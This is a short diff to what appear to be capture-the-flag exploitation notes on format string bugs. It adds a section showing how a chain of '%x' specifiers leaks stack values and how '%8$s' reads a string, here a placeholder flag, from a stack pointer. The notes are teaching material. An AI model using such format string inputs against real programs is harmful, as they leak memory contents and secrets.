@@ -126,3 +126,18 @@ payload = flat ([
 ```
 
 Observe the value of the pointer now contains: `x/2wx 0x0804a028` = `0x0804870b` our desired value.  
+
+## Read Strings From the Stack
+
+If you have a format string bug and can dump hex values, you can begin to inspect any pointers to strings  
+by calling `%s` on the pointer.  
+
+E.g.:  
+
+```bash
+> %x.%x.%x.%x.%x.%x.%x.%x 
+40.f7e1d620.8048647.0.1.f7fbd4a0.ffb3aee4.ffb3adcc
+> %8$s
+flag{flag}
+
+```
